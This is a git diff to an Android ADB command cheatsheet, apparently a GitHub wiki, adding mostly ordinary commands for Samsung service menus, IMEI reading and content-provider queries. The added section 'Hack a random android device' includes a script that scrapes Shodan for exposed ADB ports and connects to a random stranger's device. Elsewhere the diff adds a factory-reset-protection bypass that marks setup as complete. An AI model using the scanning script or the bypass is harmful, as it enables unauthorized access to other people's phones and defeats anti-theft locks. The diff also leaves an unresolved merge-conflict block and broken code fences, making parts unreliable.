@@ -15,6 +15,7 @@ I have probably spent more then `1000`h working with android devices in cli and 
 This wiki is up to date and we also cover new commands on `Android 13` - Release date for Android v13: `15 August 2022`. 
 
 
+
 ## Android 12 FRP Bypass for <small>All Samsung devices</small>
 <li><a href="https://github.com/wuseman/Android_12_FRPBypass">Samsung Android 12 FRPBypass - All models</a></li>
 
@@ -374,6 +375,35 @@ adb pull /storage/on/device /path/on/pc
 ```bash
 adb pull /storage/on/device/ /path/on/pc # Notice the trial slash
 ```
+## ADB Shell <small>uiautomator</small>
+
+* Read screen via uiautomor and print IMEI for all active esim/sim cards on device
+
+```bash
+#!/bin/bash
+# Author: wuseman
+
+### Launch IMEI screen:
+
+am start \
+    com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI \
+    uiautomator dump /sdcard/read_screen.txt;
+
+### Read and parse data from screen
+
+cat /sdcard/read_screen.txt \
+    |tr ' ' '\n'\
+    |awk -F'"' '{print $2}'\
+    |grep "^[0-9]\{15\}$"\
+    |nl -w 1 -s':'\
+    |sed 's/^/IMEI/g'
+```
+Output:
+```
+IMEI1:351800000000008
+IMEI2:351820000000006
+```
+
 ## ADB Shell <small>exec-out</small>
 
 Stream Device Screen on your PC
@@ -496,16 +526,17 @@ adb shell su -lp 2000 -c "cmd notification post -S bigtext \
 ## ADB Shell cmd <small>lock_settings</small>
 
 #### Sets the package name for server based resume on reboot service provider.
-```sh
+```bash
 adb shell cmd lock_settings set-resume-on-reboot-provider-package <package_name>
 ```
+
 ##### Removes cached unified challenge for the managed profile.
-```sh
+```bash
 adb shell cmd lock_settings remove-cache \
     --user 0 
 ```
 ##### Verifies the lock credentials.
-```sh
+```bash
 adb shell cmd lock_settings verify \
     --old 1234 --user 0 
 ```
@@ -549,7 +580,7 @@ adb shell cmd lock_settings set-pattern \
 adb shell cmd lock_settings set-disabled \
     --old 1234 \
     --user 0  `true|false`
-    ```
+```
 ##### Checks whether lock screen is disabled.
 ```sh
 adb shell cmd lock_settings get-disabled \
@@ -957,9 +988,9 @@ adb shell cmd package list packages -U
 ```
 
 #### Print all application sorted by alpha
-
- adb shell cmd package list packages|awk -F: '{print $2}'|sort
-
+```bash
+adb shell cmd package list packages|awk -F: '{print $2}'|sort
+```
 #### List packages a.k.a: pm list packages
 
 ```bash
@@ -1932,12 +1963,97 @@ adb shell enable-virtual-display `true|false`
 ```
 ## ADB Shell <small>am</small>
 
+### Launch Sysdump Menu
+```bash
+am start com.sec.android.app.servicemodeapp/.SysDump
+```
+### Launch RAMDUMP settings
+
+```bash
+am start com.sec.android.app.servicemodeapp/.CPDebugLevel
+```
+### Launch RTN settings
+```bash
+am start com.sec.android.app.servicemodeapp/.RTN_View
+```
+###  Reset Total Call Time
+```bash
+am start com.sec.android.app.servicemodeapp/.ResetTotalCallTime
+```
+### Print total call time in its own window
+```bash
+am start com.sec.android.app.servicemodeapp/.TotalCallTime
+```
+### Print wifi info Activity
+```bash
+am start com.sec.android.app.servicemodeapp/.WifiInfoActivity
+```
+### Print Nand Unique Flash Number
+```bash
+am start com.sec.android.app.servicemodeapp/.NandFlashHeaderRead
+```
+### Open Phoneutil
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil
+```
+### Launch UART USB MSM8960 Port
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUsbMSM8960
+```
+### Launch MDM 9x15 settings
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MDM9x15
+```
+### USB/UART Control
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_ESC
+```
+### USB-C/UART Control
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUSBCTCModel
+
+### Set Band Settings (Auto/SGLTE/CSFB)
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_SGLTE
+```
+### Launch UART Test Mode
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_TD
+```
+### USB/Uart (VIA/PDA)
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MarvellVIA
+```
+### USB Serioal Port Settings
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_Bcom
+```
+### Show IMEI screen
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI
+```
+### Set USB Settings
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.USBSettings
+```
+### Launch settings for auto answer without device
+```bash
+am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.AutoAnswer
+```
+
 #### Find all available modes we can launch in GUI
 ```bash
+<<<<<<< HEAD
 adb shell cmd package dump com.samsung.android.app.telephonyui \
     |grep "Activity filter" \
     |awk '{print $2}'\
     |awk '!seen[$0]++' 
+=======
+adb shell cmd package dump com.samsung.android.app.telephonyui\
+      |grep "Activity filter"\
+      |awk '{print $2}'\
+      |awk '!seen[$0]++' 
+>>>>>>> b05dc9657293b3058880093a448711ad129f7e53
 
 com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
 com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
@@ -2798,12 +2914,7 @@ cmd appops set <package_name> INSTANT_APP_START_FOREGROUND ignore
 cmd appops set <packagename> READ_CLIPBOARD allow
 ```
 
-
 ## ADB Shell <small>clipboard</small>
-
-![Good Resource](https://www.smartspate.com/how-to-copy-text-from-the-clipboard-to-android-devices/)
-
-* Different way to control clipboard, paste/copy mode
 
 #### Paste clipboard
 ```bash
@@ -2826,7 +2937,7 @@ adb cmd appops set com.bankid.bus READ_CLIPBOARD allow
 am broadcast -a clipper.set -e text "text"
 ```
 
-## ADB Shell <small>acpi</small>## ADB Shell <small>acpi</small>
+## ADB Shell <small>acpi</small>
 
 #### Print Battery Percentage
 ```bash
@@ -3063,53 +3174,42 @@ Row: 2 name=Tele2 Services, mmsproxy=mmsproxy.tele2.se
 Row: 3 name=Tele2 IMS, mmsproxy=
 ```
 
-adb shell content --sort       --uri
-adb shell content --method     --uri
-adb shell content --arg        --uri
-adb shell content --extra      --uri
-```
-
-
 ### Print heapdump
-
+```bash
 adb shell content query --uri content://com.android.shell.heapdump/
-
-
+```
 ### Print calls
-
+```bash
 adb shell content query --uri content://call_log/calls
-
+```
 ### Print shadow calls
-
+```bash
 adb shell content query --uri content://call_log_shadow/calls
-
+```
 ### Print call filters
-
+```bash
 adb shell content query --uri content://call_log/calls/filter
-
+```
 ### Print call log
-
+```bash
 adb shell content query --uri content://call_log/calls
-
-
+```
 ### Print downloads
-
+```bash
 adb shell content query --uri content://downloads/my_downloads
-
+```
 ### Print all downloads
-
+```bash
 adb shell content query --uri content://downloads/all_downloads
-
+```
 ### Print current downloads
-
+```bash
 adb shell content query --uri content://downloads/
-
+```
 ### Print my all live
-
+```bash
 adb shell content query --uri content://my.app/live
-
-### Available querys for all devices
-
+```
 ### Print sms changes
 ```bash
 adb shell content query --uri content://sms-changes
@@ -3368,7 +3468,7 @@ adb shell content query \
 ```bash
 adb shell content query \
     --uri content://contacts/organizations/
-
+```
 #### Trick device that setup already has been done (FRP Bypassing)
 
 ```bash
@@ -3376,10 +3476,13 @@ adb shellcontent insert \
     --uri content://settings/secure \
     --bind name:s:user_setup_complete \
     --bind value:s:1
-
+```
+                                                                                   
+```bash
 adb shell am start \
     -n com.google.android.gsf.login/
-
+```
+```bash
 adb shell am start \
     -n com.google.android.gsf.login.LoginActivity
 ```
@@ -3426,39 +3529,37 @@ content read  \
     |xargs ffplay a.ogg
 ```
 
-```
 #### Auto rotation on
-
 ```bash
 adb shell content insert \
     --uri content://settings/system \
     --bind name:s:accelerometer_rotation \
     --bind value:i:1
 ```
+
 #### Auto rotation off
-    
-```bash
+    ```bash
 adb shell content insert \
     --uri content://settings/system \
     --bind name:s:accelerometer_rotation \
     --bind value:i:0
 ```
 #### Rotate to landscape
-
 ```bash
 adb shell content insert \
     --uri content://settings/system \  
     --bind name:s:user_rotation \
     --bind value:i:1
 ```
-#### Rotate portrait
 
+#### Rotate portrait
 ```bash
 adb shell content insert \
     --uri content://settings/system \
     --bind name:s:user_rotation \
     --bind value:i:0
 ```
+
 ## ADB Shell <small>input</small>
 
 ####  Swipe from top and down 
@@ -3886,6 +3987,81 @@ adb shell screencap /storage/emulated/0/Pictures/screenshot.png
 adb shell screenrecord --time-limit 10 /storage/emulated/0/Video/record.mp4
 ```
 
+## Hack a random android device (ON YOUR OWN RISK)
+
+#### You need to connect to your device via `adb connect`
+
+```bash
+adb connect <ip>:<port> 
+```
+
+#### First you need to enable tcp mode as below with usb cable connected
+
+* Plugin  USB and execute
+
+```bash
+adb tcpip 5555
+```
+
+* Remove USB Cable and connect to your device via network:
+
+```bash
+adb connect <ip>:5555
+```
+
+* Now you can work with your device via network, enter shell as usual:
+
+```bash
+adb shell
+```
+
+> ⚠ WARNING: *Don't forget to `DISCONNECT` when you have finished debugging.
+You can be in danger and may be listed at shodan.io and other sites similiar to shodan if you will keep tcpip be running in background. We can find your device via a simple portscan via masscan or similiar tools, so use below command when you are done in shell:
+
+
+```bash    
+adb disconnect 
+```
+
+### To show you the danger with keep tcp mode running, for more tips to stay safe you can visit the below url for get latest commands since some are out of date I see here:
+
+[https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/)
+
+* You can copy and paste in any terminal and you are connected to a random device that has tcpip running without device owners knowledge, there is no way to figure out wihtout list connected devices ON the device. Therefore, take my warning seriously! Within ~1-3 seconds you have connected to a device. 
+
+Now imagine if we use xargs -n1 -P20, then we connect to 20 device at same time. So be careful!!
+
+```bash
+# Port for ABD
+PORT="5555"
+
+# Shodan FILTER:
+FILTER="android+debug+bridge"
+
+# Source URL:
+TARGETS="https://www.shodan.io/search?query=${FILTER}"
+
+function findTargets() {
+curl -sL ${TARGETS}|awk '!seen[$0]++'               \
+        |grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" \
+        |awk '!seen[$0]++'  |tee wadb-attack.log
+}
+
+function adbConnect() {
+grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" wadb-attack.log \
+        |sed 's/$/:5555/g'|tee target.txt
+        shuf -n1  target.txt \
+        |xargs adb connect
+}
+
+findTargets
+adbConnect
+```
+
+###### Above script is shared for educational purposes, wuseman cannot be held responsible for other users' use of the above script 
+
+// wuseman
+
 ## Android FRP BYpass by <small>wuseman</small>
 * [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_FRP.Bypass)
 * [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_Rooting)
@@ -3927,7 +4103,12 @@ For Working with Android devices via commandline
 * [Tjtech - Analyze OEM Unlocking Under Android](http://tjtech.me/analyze-oem-unlocking-under-android.html)
 * [U'Smile - How to change the IMEI on Android devices](https://usmile.at/blog/how-to-change-imei-on-android-devices)
 * [Android™ Q Navigation - Gesture Controls](https://www.xda-developers.com/android-q-navigation-gesture-controls/#fitvid892986)
-
+* [Good review for clipboard control](https://www.smartspate.com/how-to-copy-text-from-the-clipboard-to-android-devices/)
+      
+#### Wannabes that stole this wiki and claim they wrote this wiki, go f*ck yourself!
+      
+1) Srinoib is a noob:  https://github.com/Srinoid/ADB_COMMANDS
+      
 ## Wiki <small>author</small>
 
 * wuseman [wuseman@nr1.nu](mailto:wuseman@nr1.nu)
